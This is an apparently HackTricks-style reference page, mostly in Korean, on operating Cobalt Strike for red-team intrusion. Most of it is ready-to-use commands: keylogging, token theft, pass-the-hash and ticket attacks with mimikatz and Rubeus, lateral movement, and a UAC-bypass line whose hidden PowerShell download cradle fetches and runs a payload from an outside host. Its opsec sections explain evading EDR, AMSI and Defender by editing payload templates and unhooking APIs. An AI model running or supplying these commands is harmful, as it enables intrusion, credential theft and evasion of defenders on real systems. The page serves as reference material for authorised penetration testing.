# Cobalt Strike

{{#include /banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 그러면 수신 대기할 위치와 사용할 비콘 종류(http, dns, smb...) 등을 선택할 수 있습니다.

### Peer2Peer Listeners

이 수신기의 비콘은 C2와 직접 통신할 필요가 없으며, 다른 비콘을 통해 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit` 그러면 TCP 또는 SMB 비콘을 선택해야 합니다.

* **TCP 비콘은 선택한 포트에 수신기를 설정합니다**. TCP 비콘에 연결하려면 다른 비콘에서 `connect <ip> <port>` 명령을 사용합니다.
* **smb 비콘은 선택한 이름의 파이프 이름에서 수신 대기합니다**. SMB 비콘에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** HTA 파일용
* **`MS Office Macro`** 매크로가 포함된 오피스 문서용
* **`Windows Executable`** .exe, .dll 또는 서비스 .exe용
* **`Windows Executable (S)`** **스테이지리스** .exe, .dll 또는 서비스 .exe용 (스테이지리스가 스테이지보다 좋음, IoCs가 적음)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 이 명령은 Cobalt Strike에서 비콘을 다운로드하기 위한 스크립트/실행 파일을 생성합니다. 형식은 bitsadmin, exe, powershell 및 python입니다.

#### Host Payloads

호스팅할 파일이 이미 웹 서버에 있는 경우 `Attacks -> Web Drive-by -> Host File`로 이동하여 호스팅할 파일과 웹 서버 구성을 선택합니다.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># 로컬 .NET 바이너리 실행
execute-assembly </path/to/executable.exe>
# 1MB보다 큰 어셈블리를 로드하려면 malleable 프로필의 'tasks_max_size' 속성을 수정해야 합니다.

# 스크린샷
printscreen    # PrintScr 방법으로 단일 스크린샷 찍기
screenshot     # 단일 스크린샷 찍기
screenwatch    # 데스크탑의 주기적인 스크린샷 찍기
## 보기 -> 스크린샷으로 가서 확인

# 키로거
keylogger [pid] [x86|x64]
## 보기 > 키스트로크에서 눌린 키 확인

# 포트 스캔
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 다른 프로세스 내에서 포트 스캔 작업 주입
portscan [targets] [ports] [arp|icmp|none] [max connections]

# 파워셸
## 파워셸 모듈 가져오기
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <여기에 파워셸 cmd 입력> # 지원되는 가장 높은 파워셸 버전을 사용합니다 (opsec 아님)
powerpick <cmdlet> <args> # 이는 spawnto에 의해 지정된 희생 프로세스를 생성하고, 더 나은 opsec를 위해 UnmanagedPowerShell을 주입합니다 (로깅 없음)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # 이는 지정된 프로세스에 UnmanagedPowerShell을 주입하여 PowerShell cmdlet을 실행합니다.


# 사용자 가장
## 자격 증명으로 토큰 생성
make_token [DOMAIN\user] [password] # 네트워크에서 사용자를 가장하기 위한 토큰 생성
ls \\computer_name\c$ # 생성된 토큰을 사용하여 컴퓨터의 C$에 접근 시도
rev2self # make_token으로 생성된 토큰 사용 중지
## make_token 사용 시 이벤트 4624가 생성됩니다: 계정이 성공적으로 로그인되었습니다. 이 이벤트는 Windows 도메인에서 매우 일반적이지만, 로그온 유형으로 필터링하여 좁힐 수 있습니다. 위에서 언급했듯이, 이는 LOGON32_LOGON_NEW_CREDENTIALS를 사용하며, 이는 유형 9입니다.

# UAC 우회
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pid에서 토큰 훔치기
## make_token과 유사하지만 프로세스에서 토큰을 훔칩니다
steal_token [pid] # 또한, 이는 네트워크 작업에 유용하며, 로컬 작업에는 유용하지 않습니다
## API 문서에서 이 로그온 유형은 "호출자가 현재 토큰을 복제할 수 있도록 허용합니다"라고 알려져 있습니다. 이 때문에 비콘 출력에서 Impersonated <current_username>라고 표시됩니다 - 이는 우리의 복제된 토큰을 가장하고 있습니다.
ls \\computer_name\c$ # 생성된 토큰을 사용하여 컴퓨터의 C$에 접근 시도
rev2self # steal_token에서 토큰 사용 중지

## 새로운 자격 증명으로 프로세스 시작
spawnas [domain\username] [password] [listener] # 읽기 권한이 있는 디렉토리에서 수행: cd C:\
## make_token과 유사하게, 이는 Windows 이벤트 4624를 생성합니다: 계정이 성공적으로 로그인되었습니다. 그러나 로그온 유형은 2 (LOGON32_LOGON_INTERACTIVE)입니다. 호출 사용자(TargetUserName)와 가장된 사용자(TargetOutboundUserName)가 상세히 설명됩니다.

## 프로세스에 주입
inject [pid] [x64|x86] [listener]
## OpSec 관점에서: 정말 필요하지 않는 한 크로스 플랫폼 주입을 수행하지 마십시오 (예: x86 -> x64 또는 x64 -> x86).

## 해시 전달
## 이 수정 프로세스는 LSASS 메모리를 패치해야 하며, 이는 고위험 작업으로 로컬 관리자 권한이 필요하고 Protected Process Light (PPL)가 활성화된 경우에는 실행 가능성이 낮습니다.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## mimikatz를 통한 해시 전달
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## /run 없이, mimikatz는 cmd.exe를 생성합니다. 데스크탑에서 실행 중인 사용자로 실행하면 셸을 볼 수 있습니다 (SYSTEM으로 실행 중이면 괜찮습니다)
steal_token <pid> # mimikatz에 의해 생성된 프로세스에서 토큰 훔치기

## 티켓 전달
## 티켓 요청
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## 새로운 티켓을 사용하기 위해 새로운 로그온 세션 생성 (손상된 세션을 덮어쓰지 않기 위해)
make_token <domain>\<username> DummyPass
## 파워셸 세션에서 공격자 머신에 티켓을 작성하고 로드합니다
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM에서 티켓 전달
## 티켓으로 새로운 프로세스 생성
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## 해당 프로세스에서 토큰 훔치기
steal_token <pid>

## 티켓 추출 + 티켓 전달
### 티켓 목록
execute-assembly C:\path\Rubeus.exe triage
### 흥미로운 티켓을 luid로 덤프
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### 새로운 로그온 세션 생성, luid 및 processid 기록
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 생성된 로그온 세션에 티켓 삽입
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 마지막으로, 해당 새로운 프로세스에서 토큰 훔치기
steal_token <pid>

# Lateral Movement
## 토큰이 생성되면 사용됩니다
jump [method] [target] [listener]
## 방법:
## psexec                    x86   서비스 EXE 아티팩트를 실행하기 위해 서비스를 사용합니다
## psexec64                  x64   서비스 EXE 아티팩트를 실행하기 위해 서비스를 사용합니다
## psexec_psh                x86   서비스를 사용하여 PowerShell 원라이너를 실행합니다
## winrm                     x86   WinRM을 통해 PowerShell 스크립트를 실행합니다
## winrm64                   x64   WinRM을 통해 PowerShell 스크립트를 실행합니다
## wmi_msbuild               x64   msbuild 인라인 C# 작업을 사용한 wmi 측면 이동 (opsec)


remote-exec [method] [target] [command] # remote-exec는 출력을 반환하지 않습니다
## 방법:
## psexec                          서비스 제어 관리자 통해 원격 실행
## winrm                           WinRM (PowerShell)을 통해 원격 실행
## wmi                             WMI를 통해 원격 실행

## wmi를 사용하여 비콘을 실행하려면 (jump 명령에 포함되지 않음) 비콘을 업로드하고 실행합니다
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Metasploit에 세션 전달 - 리스너를 통해
## 메타플로잇 호스트에서
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## 코발트에서: 리스너 > 추가하고 페이로드를 외부 HTTP로 설정합니다. 호스트를 10.10.5.120으로, 포트를 8080으로 설정하고 저장을 클릭합니다.
beacon> spawn metasploit
## 외부 리스너로 x86 Meterpreter 세션만 생성할 수 있습니다.

# Metasploit 세션을 Cobalt Strike로 전달
## 스테이지리스 비콘 셸코드를 생성합니다. Attacks > Packages > Windows Executable (S)로 이동하여 원하는 리스너를 선택하고 출력 유형으로 Raw를 선택한 후 x64 페이로드를 선택합니다.
## metasploit에서 post/windows/manage/shellcode_inject를 사용하여 생성된 Cobalt Strike 셸코드를 주입합니다.


# Pivoting
## 팀 서버에서 소켓 프록시 열기
beacon> socks 1080

# SSH 연결
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`**는 원격 프로세스 주입을 사용하여 지정된 프로그램을 실행하는 **희생 프로세스**를 사용합니다. 이는 프로세스 내에서 주입하기 위해 특정 Win API가 사용되므로 매우 시끄럽습니다. 모든 EDR이 이를 확인하고 있습니다. 그러나 동일한 프로세스에서 무언가를 로드하는 데 사용할 수 있는 몇 가지 사용자 지정 도구가 있습니다:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike에서는 BOF (Beacon Object Files)를 사용할 수도 있습니다: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

agressor 스크립트 `https://github.com/outflanknl/HelpColor`는 Cobalt Strike에서 `helpx` 명령을 생성하여 BOF(녹색), Frok&Run(노란색) 및 유사한 명령에 색상을 표시합니다. 또는 ProcessExecution, injection 또는 유사한 명령(빨간색)으로 표시합니다. 이는 어떤 명령이 더 은밀한지 아는 데 도움이 됩니다.

### 사용자로 행동하기

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`와 같은 이벤트를 확인할 수 있습니다:

- 보안 EID 4624 - 일반적인 운영 시간을 알기 위해 모든 대화형 로그온을 확인합니다.
- 시스템 EID 12,13 - 종료/시작/수면 빈도를 확인합니다.
- 보안 EID 4624/4625 - 유효/무효 NTLM 시도를 확인합니다.
- 보안 EID 4648 - 이 이벤트는 평문 자격 증명이 로그온에 사용될 때 생성됩니다. 프로세스가 이를 생성한 경우, 이진 파일은 구성 파일이나 코드 내에 평문 자격 증명을 포함할 가능성이 있습니다.

Cobalt Strike에서 `jump`를 사용할 때, 새로운 프로세스가 더 합법적으로 보이도록 `wmi_msbuild` 방법을 사용하는 것이 좋습니다.

### 컴퓨터 계정 사용

수비수들이 사용자로부터 생성된 이상한 행동을 확인하는 것이 일반적이며, **서비스 계정 및 `*$`와 같은 컴퓨터 계정을 모니터링에서 제외합니다**. 이러한 계정을 사용하여 측면 이동 또는 권한 상승을 수행할 수 있습니다.

### 스테이지리스 페이로드 사용

스테이지리스 페이로드는 C2 서버에서 두 번째 단계를 다운로드할 필요가 없기 때문에 스테이지 페이로드보다 덜 시끄럽습니다. 이는 초기 연결 이후 네트워크 트래픽을 생성하지 않으므로 네트워크 기반 방어에 의해 감지될 가능성이 줄어듭니다.

### 토큰 및 토큰 저장소

토큰을 훔치거나 생성할 때 주의하십시오. EDR이 모든 스레드의 모든 토큰을 열거하고 **다른 사용자** 또는 심지어 SYSTEM에 속하는 **토큰을 찾을 수 있는 가능성이 있습니다**.

이것은 **비콘별로** 토큰을 저장할 수 있게 하여 같은 토큰을 반복해서 훔칠 필요가 없도록 합니다. 이는 측면 이동이나 훔친 토큰을 여러 번 사용해야 할 때 유용합니다:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

측면 이동 시, 일반적으로 **새로운 토큰을 생성하는 것보다 토큰을 훔치는 것이 더 좋습니다**.

### 가드레일

Cobalt Strike에는 **가드레일**이라는 기능이 있어 방어자가 감지할 수 있는 특정 명령이나 작업의 사용을 방지하는 데 도움이 됩니다. 가드레일은 `make_token`, `jump`, `remote-exec`와 같은 특정 명령을 차단하도록 구성할 수 있으며, 이는 일반적으로 측면 이동이나 권한 상승에 사용됩니다.

또한, 리포지토리 [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks)에는 페이로드를 실행하기 전에 고려할 수 있는 몇 가지 검사 및 아이디어가 포함되어 있습니다.

### 티켓 암호화

AD에서 티켓의 암호화에 주의하십시오. 기본적으로 일부 도구는 Kerberos 티켓에 대해 RC4 암호화를 사용하며, 이는 AES 암호화보다 덜 안전합니다. 기본적으로 최신 환경은 AES를 사용합니다. 이는 약한 암호화 알고리즘을 모니터링하는 방어자에 의해 감지될 수 있습니다.

### 기본값 피하기

Cobalt Strike를 사용할 때 기본적으로 SMB 파이프는 `msagent_####` 및 `"status_####`라는 이름을 가집니다. 이러한 이름을 변경하십시오. Cobalt Strike에서 기존 파이프의 이름을 확인하려면 다음 명령을 사용할 수 있습니다: `ls \\.\pipe\`

또한 SSH 세션에서는 `\\.\pipe\postex_ssh_####`라는 파이프가 생성됩니다. 이를 `set ssh_pipename "<new_name>";`으로 변경하십시오.

또한 포스트 익스플로잇 공격에서 `\\.\pipe\postex_####` 파이프는 `set pipename "<new_name>"`으로 수정할 수 있습니다.

Cobalt Strike 프로필에서도 다음과 같은 사항을 수정할 수 있습니다:

- `rwx` 사용 피하기
- `process-inject {...}` 블록에서 프로세스 주입 동작이 작동하는 방식 (어떤 API가 사용될지)
- `post-ex {…}` 블록에서 "fork and run"이 작동하는 방식
- 대기 시간
- 메모리에 로드될 이진 파일의 최대 크기
- 메모리 발자국 및 DLL 내용 `stage {...}` 블록으로
- 네트워크 트래픽

### 메모리 스캔 우회

일부 EDR은 알려진 맬웨어 서명을 위해 메모리를 스캔합니다. Cobalt Strike는 백도어를 메모리에서 암호화할 수 있는 `sleep_mask` 함수를 BOF로 수정할 수 있습니다.

### 시끄러운 프로세스 주입

프로세스에 코드를 주입할 때 일반적으로 매우 시끄럽습니다. 이는 **정상적인 프로세스가 일반적으로 이 작업을 수행하지 않기 때문이며, 이를 수행하는 방법이 매우 제한적이기 때문입니다**. 따라서 행동 기반 탐지 시스템에 의해 감지될 수 있습니다. 또한, EDR이 **디스크에 없는 코드를 포함하는 스레드를 스캔하여 감지할 수 있습니다** (브라우저와 같은 프로세스는 JIT를 사용하여 일반적으로 이를 사용합니다). 예: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID 및 PPID 관계

새로운 프로세스를 생성할 때 **정상적인 부모-자식** 관계를 유지하는 것이 중요합니다. svchost.exec가 iexplorer.exe를 실행하면 의심스러워 보입니다. svchost.exe는 정상적인 Windows 환경에서 iexplorer.exe의 부모가 아니기 때문입니다.

Cobalt Strike에서 새로운 비콘이 생성될 때 기본적으로 **`rundll32.exe`**를 사용하는 프로세스가 생성되어 새로운 리스너를 실행합니다. 이는 매우 은밀하지 않으며 EDR에 의해 쉽게 감지될 수 있습니다. 또한, `rundll32.exe`는 인수 없이 실행되어 더욱 의심스럽습니다.

다음 Cobalt Strike 명령을 사용하여 새로운 비콘을 생성할 다른 프로세스를 지정할 수 있습니다.
```bash
spawnto x86 svchost.exe
```
당신은 프로필에서 **`spawnto_x86` 및 `spawnto_x64`** 설정을 변경할 수 있습니다.

### 공격자의 트래픽 프록시

공격자는 때때로 도구를 로컬에서 실행할 수 있어야 하며, 심지어 리눅스 머신에서도 피해자의 트래픽이 도구에 도달하게 해야 합니다 (예: NTLM 릴레이).

게다가, 패스-더-해시 또는 패스-더-티켓 공격을 수행할 때 공격자가 **자신의 LSASS 프로세스에 이 해시 또는 티켓을 추가하는 것이** 더 은밀할 수 있으며, 피해자 머신의 LSASS 프로세스를 수정하는 것보다 더 효과적입니다.

그러나 **생성된 트래픽에 주의해야** 합니다. 백도어 프로세스에서 비정상적인 트래픽(케르베로스?)을 전송할 수 있기 때문입니다. 이를 위해 브라우저 프로세스로 피벗할 수 있지만, 프로세스에 자신을 주입하는 것이 발각될 수 있으므로 은밀한 방법을 생각해야 합니다.
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> 비밀번호 변경  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Change powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Change $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include /banners/hacktricks-training.md}}
